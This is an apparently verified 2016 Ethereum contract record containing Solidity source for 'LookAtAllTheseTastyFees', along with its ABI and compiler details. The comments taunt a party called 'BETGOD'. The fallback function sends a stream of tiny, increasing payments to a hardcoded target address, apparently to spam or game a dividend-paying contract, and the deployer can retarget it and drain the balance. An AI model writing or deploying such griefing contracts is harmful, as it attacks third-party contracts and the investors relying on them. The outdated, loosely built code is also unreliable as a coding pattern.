{"SourceCode":"// IF YOU CAN'T LISTEN TO MY CONCERNS BETGOD\r\n// THEN I HAVE TO DO IT THIS WAY.\r\n\r\n\r\n// LOOK AT ALL THESE DIVIDEND\r\n// YUM YUM YUM\r\n// ALL FOR YOUR INVESTORS\r\n// CHEEER CHEEER\r\n\r\n// OW WAIT!!\r\n\r\n\r\n\r\ncontract LookAtAllTheseTastyFees {\r\n\r\naddress public deployer;\r\naddress public targetAddr;\r\n\r\n\r\nmodifier execute {\r\n    if (msg.sender == deployer)\r\n        _\r\n}\r\n\r\n\r\nfunction LookAtAllTheseTastyFees() {\r\n    deployer = msg.sender;\r\n    targetAddr = 0xEe462A6717f17C57C826F1ad9b4d3813495296C9;\r\n}\r\n\r\n\r\nfunction() {\r\n    uint o = 0 finney; \r\n    for (uint i = 0 finney; o < this.balance; i++ ) {\r\n        targetAddr.send(i);\r\n        o += i;\r\n    }\r\n}\r\n\r\n\r\nfunction SetAddr (address _newAddr) execute {\r\n    targetAddr = _newAddr;\r\n}\r\n\r\n\r\nfunction TestContract() execute {\r\n    deployer.send(this.balance);\r\n}\r\n\r\n\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"TestContract\",\"outputs\":[],\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_newAddr\",\"type\":\"address\"}],\"name\":\"SetAddr\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"targetAddr\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"deployer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"LookAtAllTheseTastyFees","CompilerVersion":"v0.3.1-2016-04-07-054bc2a","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"","SwarmSource":""}
